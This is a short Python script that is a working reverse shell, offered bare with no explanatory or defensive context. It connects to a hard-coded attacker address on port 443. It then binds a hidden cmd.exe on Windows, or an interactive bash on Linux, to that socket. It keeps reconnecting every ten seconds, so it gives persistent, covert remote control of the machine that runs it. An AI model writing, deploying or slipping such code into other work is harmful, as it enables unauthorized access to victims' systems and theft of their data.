import socket
import os
import sys
import subprocess
import time

ATTACKER_IP = "192.168.1.77"
PORT = 443

def windows_shell():
    while True:
        try:
            s = socket.create_connection((ATTACKER_IP, PORT), timeout=30)
            subprocess.Popen(
                ["cmd.exe", "/K"],  # /K keeps shell open
                stdin=s.fileno(),
                stdout=s.fileno(),
                stderr=s.fileno(),
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            s.close()
            time.sleep(86400)  # 24h timeout
        except:
            time.sleep(10)  # Retry every 10s

def linux_shell():
    while True:
        try:
            s = socket.create_connection((ATTACKER_IP, PORT), timeout=30)
            os.dup2(s.fileno(), 0)
            os.dup2(s.fileno(), 1)
            os.dup2(s.fileno(), 2)
            subprocess.call(["/bin/bash", "-i"])  # Full interactive shell
            s.close()
        except:
            time.sleep(10)  # Retry every 10s

if __name__ == "__main__":
    if sys.platform == "win32":
        windows_shell()
    else:
        linux_shell()
